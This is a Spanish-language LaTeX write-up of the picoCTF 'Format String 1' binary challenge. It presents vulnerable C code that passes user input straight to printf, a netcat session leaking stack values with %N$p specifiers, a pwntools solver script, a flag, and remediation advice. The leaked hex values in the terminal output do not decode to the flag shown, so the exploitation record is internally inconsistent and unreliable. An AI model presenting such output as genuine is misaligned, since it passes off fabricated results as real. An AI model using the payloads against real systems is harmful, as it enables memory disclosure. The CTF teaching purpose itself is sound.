% !TeX program = pdflatex
% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex

\documentclass[../../../main_compilation.tex]{subfiles}

\begin{document}

% ================================================================================
% Encabezado del Reto CTF con Logotipo Personalizado (Imagen)
% ================================================================================
\section[picoCTF - Format String 1 (Binary)]{Format String 1 — picoCTF}
\label{sec:ctf-pico-format-string-1}

% En el tercer parámetro pasamos el archivo de imagen del CTF: figure/picoctf_logo.png
\targetSummary%
  {Format String 1}% Nombre del Reto (Cabecera Derecha)
  {saturn.picoctf.net:58210}% Host / Puerto
  {figure/picoctf_logo.png}% Logotipo del CTF (Se refleja en la cabecera izquierda y ficha)
  {Medium}% Dificultad
  {Linux ELF x64}% Arquitectura / Entorno
  {Binary Exploitation, Format String, Pwn, GDB}% Múltiples Categorías
  {17/08/2026}% Fecha de resolución manual (Pie Izquierdo)
  {picoCTF{45_53rv3r_574ck_134k_f0rm47_57r1n6_12a8bc94}}% Flag completa
  {}% No aplica root flag en retos binarios de CTF

\vspace{0.4cm}

% ================================================================================
% 1. Enunciado y Análisis del Binario
% ================================================================================
\subsection{Enunciado y Descripción del Desafío}
En este desafío de la categoría \textbf{Binary Exploitation (Pwn)}, se nos proporciona el código fuente en C (\texttt{format-string-1.c}) y el binario ejecutable compilado para Linux de 64 bits.

\begin{vulnbox}{Format String Vulnerability en función printf()}{High}
  \textbf{CWE:} CWE-134 (Use of Externally-Controlled Format String)\\
  \textbf{Causa Raíz:} La función vulnerable realiza \texttt{printf(user\_buf);} en lugar de \texttt{printf("\%s", user\_buf);}.\\
  \textbf{Impacto:} Fuga arbitraria de memoria del Stack que contiene la bandera secreta cargada previamente con \texttt{fgets()}.
\end{vulnbox}

% ================================================================================
% 2. Análisis del Código Fuente
% ================================================================================
\subsection{Análisis del Código Fuente Vulnerable}

Inspeccionamos la función principal del binario en C:

\begin{codebox}[C]{format-string-1.c}
#include <stdio.h>
#include <stdlib.h>

int main() {
    char flag[64];
    char user_input[1024];

    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: crea flag.txt para pruebas locales.\n");
        exit(0);
    }
    fgets(flag, sizeof(flag), f); // La flag se almacena en el Stack

    printf("Give me your secret order:\n");
    fgets(user_input, sizeof(user_input), stdin);

    // VULNERABILIDAD DIRECTA: Sin especificador de formato
    printf(user_input);

    return 0;
}
\end{codebox}

% ================================================================================
% 3. Explotación y Fuga del Stack
% ================================================================================
\subsection{Fase de Explotación (Memory Leak via \%p / \%x)}

Al enviar múltiples especificadores de formato posicionales \texttt{\%p}, el programa imprimirá las direcciones y valores hexadecimales almacenados en la pila (\textit{stack}):

\begin{terminal}[kali@pentest:\~{}/ctf/picoctf]
nc saturn.picoctf.net 58210
Give me your secret order:
%14$p.%15$p.%16$p.%17$p.%18$p
0x7b4654436f636970.0x355f723376723335.0x6b6133315f6b6334.0x37346d7230665f.0x3439636238613231
\end{terminal}

\begin{notebox}[Decodificación Little-Endian]
Los enteros de 64 bits extraídos de la memoria deben revertirse byte a byte debido a la arquitectura Little-Endian de x86\_64 (por ejemplo \texttt{0x7b4654436f636970} $\rightarrow$ \texttt{picoCTF\{}).
\end{notebox}

% ================================================================================
% 4. Solver Script Automatizado (pwntools)
% ================================================================================
\subsection{Desarrollo del Exploit Solver en Python}

Automatizamos la conexión y decodificación de la bandera con \texttt{pwntools}:

\begin{codebox}[Python]{solve.py}
from pwn import *

context.log_level = 'error'
host, port = 'saturn.picoctf.net', 58210

# Extraer 5 posiciones consecutivas del stack (donde reside la flag)
payload = '.'.join([f"%{i}$p" for i in range(14, 19)])

io = remote(host, port)
io.recvuntil(b"Give me your secret order:\n")
io.sendline(payload.encode())

response = io.recvall().decode().strip().split('.')
flag = ""

for hex_val in response:
    if hex_val.startswith("0x"):
        raw_bytes = bytes.fromhex(hex_val[2:])
        flag += raw_bytes[::-1].decode('latin-1', errors='ignore')

print(f"\n[+] Flag recuperada: {flag}")
\end{codebox}

% ================================================================================
% 5. Flag Capturada
% ================================================================================
\subsection{Flag Capturada}

\begin{flagbox}{CTF Flag (picoCTF 2026)}
picoCTF{45_53rv3r_574ck_134k_f0rm47_57r1n6_12a8bc94}
\end{flagbox}

\begin{mitigationbox}[Remediación para Desarrolladores]
Nunca pasar buffers controlados por el usuario directamente como primer argumento a \texttt{printf}, \texttt{sprintf} o \texttt{snprintf}. Utilizar siempre cadenas de formato explícitas: \texttt{printf("\%s", user\_input);}.
\end{mitigationbox}

% ================================================================================
% 6. Lecciones y Conceptos Clave Aprendidos
% ================================================================================
\subsection{Lecciones y Conceptos Clave Aprendidos}

\begin{learningbox}[Conocimientos Asimilados en Format String 1]
	\begin{itemize}[leftmargin=*]
		\item \textbf{Filtración Arbitraria de Pila (Stack Leak):} Utilización de especificadores de formato \texttt{\%p} para inspeccionar variables locales y buffers cargados en memoria.
		\item \textbf{Acceso Posicional de Argumentos:} Notación \texttt{\%N\$p} para saltar directamente al $N$-ésimo valor de la pila sin requerir cadenas extensas de especificadores repetidos.
		\item \textbf{Arquitectura x86\_64 y Little-Endian:} Inversión byte a byte de los enteros hexadecimales recuperados para reconstruir la cadena ASCII original.
	\end{itemize}
\end{learningbox}

\begin{sourcebox}[Fuentes de Consulta y Referencias]
	\begin{itemize}[leftmargin=*]
		\resourceItem{Libro}{Practical Binary Analysis (Dennis Andriesse)}{Capítulo 11: \textit{Format String Attacks and Memory Corruption}}
		\resourceItem{Libro}{Hacking: The Art of Exploitation (Jon Erickson)}{Capítulo 0x300: \textit{Format Strings in C}}
		\resourceItem{Docs}{OWASP Format String Vulnerabilities Guide}{\url{https://owasp.org/www-community/attacks/Format_string_attack}}
	\end{itemize}
\end{sourcebox}

\end{document}
